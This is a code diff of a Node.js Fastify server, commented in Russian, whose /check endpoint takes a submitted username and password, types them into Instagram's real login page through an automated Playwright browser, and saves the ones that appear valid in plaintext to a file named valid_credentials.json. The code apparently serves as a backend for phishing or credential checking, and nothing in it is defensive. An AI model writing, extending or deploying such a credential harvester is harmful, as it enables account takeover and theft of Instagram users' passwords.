@@ -9,29 +9,16 @@ const DATA_FILE = "valid_credentials.json";
 const app = Fastify();
 app.register(cors);
 
-function validateCredentials(username, password) {
-    if (!username || !password) {
-        return { valid: false, message: "Логин и пароль обязательны!" };
-    }
-    if (password.length < 6) {
-        return { valid: false, message: "Пароль должен быть минимум 6 символов." };
-    }
-    const usernameRegex = /^[a-zA-Z0-9._]+$/;
-    if (!usernameRegex.test(username)) {
-        return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
-    }
-    return { valid: true };
-}
 
-function saveCredentials(username, password) {
-    let credentials = [];
-    if (fs.existsSync(DATA_FILE)) {
-        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
-    }
-    credentials.push({ username, password });
-    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
-}
+/*const activeBrowsers = new Map();
+app.post("/username-changed",async(request, reply) => {
+    try {
 
+    }catch(error){
+
+    }
+})
+    */
 app.post("/check", async (request, reply) => {
     console.log("Новый POST-запрос на /check", request.body);
 
@@ -44,16 +31,25 @@ app.post("/check", async (request, reply) => {
 
     console.log(`Начинаем проверку логина для пользователя: ${username}`);
 
-    const browser = await chromium.launch({ headless: true });
+    const browser = await chromium.launch({ headless: false }); // Открываем браузер (НЕ headless)
     const page = await browser.newPage();
 
     try {
-        await page.goto("https://www.instagram.com/accounts/login/");
-        await page.waitForSelector("input[name='username']", { timeout: 5000 });
+        await page.goto("https://www.instagram.com/accounts/login/", { timeout: 10000 });
+        console.log("Страница загружена");
+
+        await page.waitForSelector("input[name='username']", { timeout: 10000 });
+        await page.waitForSelector("input[name='password']", { timeout: 10000 });
+
+        console.log("Поля ввода найдены, начинаем ввод данных");
+
         await page.fill("input[name='username']", username);
         await page.fill("input[name='password']", password);
+
+        console.log("Данные введены, нажимаем на кнопку входа");
         await page.click("button[type='submit']");
-        await page.waitForTimeout(5000);
+
+        await page.waitForTimeout(1000);
 
         const errorMessage = await page.locator("div.xkmlbd1").count();
         if (errorMessage > 0) {
@@ -85,6 +81,31 @@ app.post("/check", async (request, reply) => {
         return reply.send({ error: true, message: "Ошибка сервера" });
     }
 });
+
+
+function validateCredentials(username, password) {
+    if (!username || !password) {
+        return { valid: false, message: "Логин и пароль обязательны!" };
+    }
+    if (password.length < 6) {
+        return { valid: false, message: "Пароль должен быть минимум 6 символов." };
+    }
+    const usernameRegex = /^[a-zA-Z0-9._]+$/;
+    if (!usernameRegex.test(username)) {
+        return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
+    }
+    return { valid: true };
+}
+
+function saveCredentials(username, password) {
+    let credentials = [];
+    if (fs.existsSync(DATA_FILE)) {
+        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
+    }
+    credentials.push({ username, password });
+    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
+}
+
 
 app.get("/", async (request, reply) => {
     reply.send("Сервер работает!");
